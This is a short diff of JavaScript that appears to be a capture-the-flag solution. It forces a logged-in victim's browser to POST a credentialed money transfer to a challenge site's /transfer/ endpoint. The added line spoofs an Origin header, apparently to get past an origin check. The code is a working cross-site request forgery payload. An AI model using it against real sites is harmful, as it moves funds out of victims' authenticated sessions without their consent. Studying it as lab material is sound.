@@ -4,6 +4,7 @@
 
 var xhr2 = new XMLHttpRequest();
 xhr2.open("POST", "https://upcredit4.chall.malicecyber.com/transfer/", false);
+xhr2.setRequestHeader('origin', 'https://upcredit4.chall.malicecyber.com/');
 xhr2.withCredentials = true;
 xhr2.send("account=ld7RnN2yU&amount=200");
 var xhr = new XMLHttpRequest();
